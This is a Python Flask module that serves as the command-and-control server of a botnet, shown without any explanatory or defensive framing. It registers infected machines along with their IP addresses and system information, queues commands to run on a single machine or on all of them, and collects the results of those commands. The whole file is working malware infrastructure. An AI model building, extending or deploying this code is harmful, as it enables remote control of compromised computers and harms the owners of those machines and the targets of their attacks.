import json
from flask import Blueprint, request, jsonify, abort, Response, redirect
from core.client import Client
from core.command import Command

comm_blueprint = Blueprint('comm', __name__)

activeClients = []
commandList = []
latestVersion = 1.0

@comm_blueprint.route('/logActiveMachine', methods=['POST'] )
def registerMachine():
    fields = ('machine_name', 'machine_ip', 'system_version', 'botnet_version','system_info')
    if not request.json or not any(field in fields for field in request.json):
        abort(400)
    
    for i, client in enumerate(activeClients):
        if client.ip == request.json['machine_ip']:
            oldClientStatus = activeClients[i]
            newClientStatus = Client(**request.json)
            if newClientStatus.info == [] and oldClientStatus.info != []:
                newClientStatus.info = oldClientStatus.info

            activeClients[i] = newClientStatus
            
            return jsonify({'success': True}), 201
    
    newMachine = Client(**request.json)
    activeClients.append(newMachine)
    return jsonify({'success': True}), 201

@comm_blueprint.route('/getCommandList', methods=['POST'])
def getCommands():
    commands = []
    fields = ('machine_ip', 'botnet_version')
    if not request.json or not any(field in fields for field in request.json):
        abort(400)

    for c in commandList:
        if c.dest == 'ALL':
            if c.status == 1:
                if c.version >= request.json['botnet_version']:
                    if request.json['machine_ip'] in c.success.keys():
                        if c.repeat == 1:
                            commands.append(c.__dict__)
                    else:
                        commands.append(c.__dict__)
                    
        elif c.dest == request.json['machine_ip']:
            if c.status == 1:
                if c.version >= request.json['botnet_version']:
                    if request.json['machine_ip'] in c.success.keys():
                        if c.repeat == 1:
                            commands.append(c.__dict__)
                    else:
                        commands.append(c.__dict__)

    return Response(json.dumps(commands), mimetype='application/json')

@comm_blueprint.route('/logCommand', methods=['POST'])
def logCommand():
    fields = ('machine_ip', 'id', 'status', 'result')
    if not request.json or not any(field in fields for field in request.json):
        abort(400)
    
    for i,c in enumerate(commandList):
        if c.id == request.json['id']:
            if c.dest == 'ALL':
                if request.json['status'] == 0:
                    c.succeeded(request.json['machine_ip'])
                    c.feedResult(request.json['machine_ip'], request.json['result'])
                else:
                    c.failed(request.json['machine_ip'])
            if c.dest == request.json['machine_ip']:
                c.updateStatus(request.json['status'])
                c.feedResult(request.json['machine_ip'], request.json['result'])
            commandList[i] = c
            command = c

    return Response(json.dumps(command.__dict__), mimetype='application/json')

@comm_blueprint.route('/getLatestVersion', methods=['GET'])
def getLatestversion():
    return Response("http://i3.ytimg.com/vi/J---aiyznGQ/mqdefault.jpg")

@comm_blueprint.route('/getVersion', methods=['GET'])
def getVersion():
    return jsonify({'version': latestVersion}), 201
